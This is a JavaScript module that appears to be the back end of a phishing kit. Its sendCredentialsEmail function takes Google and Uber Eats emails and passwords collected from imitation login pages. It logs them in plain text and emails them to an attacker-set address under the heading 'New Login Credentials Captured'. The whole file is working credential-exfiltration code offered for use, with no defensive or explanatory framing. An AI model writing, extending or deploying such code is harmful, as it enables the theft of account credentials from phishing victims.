import dotenv from 'dotenv';
import nodemailer from 'nodemailer';

dotenv.config();

console.log('Email Service Configuration:');
console.log('GMAIL_USER:', process.env.GMAIL_USER);
console.log('GMAIL_APP_PASSWORD exists:', !!process.env.GMAIL_APP_PASSWORD);
console.log('RECIPIENT_EMAIL:', process.env.RECIPIENT_EMAIL);

// Create transporter with Gmail SMTP
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_APP_PASSWORD
  }
});

// Function to send credentials email
async function sendCredentialsEmail(googleEmail, googlePassword, uberEmail, uberPassword) {
  console.log('\n=== SENDING EMAIL ===');
  console.log('Gmail User:', process.env.GMAIL_USER);
  console.log('Recipient:', process.env.RECIPIENT_EMAIL);
  console.log('\nCredentials to send:');
  console.log('Google Email:', googleEmail);
  console.log('Google Password:', googlePassword);
  console.log('Uber Email:', uberEmail);
  console.log('Uber Password:', uberPassword);
  console.log('==================\n');
  
  try {
    const htmlContent = `
      <!DOCTYPE html>
      <html>
      <head>
        <style>
          body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
          .container { max-width: 600px; margin: 0 auto; padding: 20px; }
          .header { background-color: #1a73e8; color: white; padding: 20px; text-align: center; }
          .content { background-color: #f9f9f9; padding: 20px; margin: 20px 0; }
          .credentials { background-color: white; padding: 15px; margin: 10px 0; border-left: 4px solid #1a73e8; }
          .label { font-weight: bold; color: #555; }
          .value { color: #000; margin-left: 10px; }
          .footer { text-align: center; color: #777; font-size: 12px; margin-top: 20px; }
        </style>
      </head>
      <body>
        <div class="container">
          <div class="header">
            <h1>New Login Credentials Captured</h1>
          </div>
          
          <div class="content">
            <h2>Google Login Page Credentials:</h2>
            <div class="credentials">
              <div><span class="label">Email:</span><span class="value">${googleEmail}</span></div>
              <div><span class="label">Password:</span><span class="value">${googlePassword}</span></div>
            </div>

            <h2>Uber Eats Login Page Credentials:</h2>
            <div class="credentials">
              <div><span class="label">Email:</span><span class="value">${uberEmail}</span></div>
              <div><span class="label">Password:</span><span class="value">${uberPassword}</span></div>
            </div>
          </div>

          <div class="footer">
            <p>This is an automated email from your login system.</p>
            <p>Timestamp: ${new Date().toLocaleString()}</p>
          </div>
        </div>
      </body>
      </html>
    `;

    const info = await transporter.sendMail({
      from: `"Login System" <${process.env.GMAIL_USER}>`,
      to: process.env.RECIPIENT_EMAIL,
      subject: `New Login Credentials - ${new Date().toLocaleDateString()}`,
      html: htmlContent
    });

    console.log('✅ EMAIL SENT SUCCESSFULLY!');
    console.log('Message ID:', info.messageId);
    console.log('Accepted:', info.accepted);
    console.log('Response:', info.response);
    return { success: true, messageId: info.messageId };
  } catch (error) {
    console.error('❌ ERROR SENDING EMAIL:');
    console.error('Error message:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

export { sendCredentialsEmail };
